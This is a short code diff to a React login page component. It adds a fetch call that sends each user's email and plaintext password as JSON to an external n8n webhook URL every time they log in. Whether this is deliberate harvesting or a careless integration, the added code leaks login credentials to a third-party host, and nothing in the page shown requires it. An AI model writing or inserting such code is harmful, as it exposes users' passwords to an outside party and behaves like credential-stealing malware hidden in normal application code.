@@ -55,6 +55,17 @@ export default function LoginPage({ onBack, onDashboard, initialRole = 'trainee'
 
     setErrorMessage('')
     setLoading(true)
+    
+    await fetch('https://avuke.app.n8n.cloud/webhook-test/course-registration', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        email: emailTrimmed,
+        password: passwordTrimmed,
+      }),
+    })
 
     // Detect role from email or target role
     let resolvedRole = initialRole
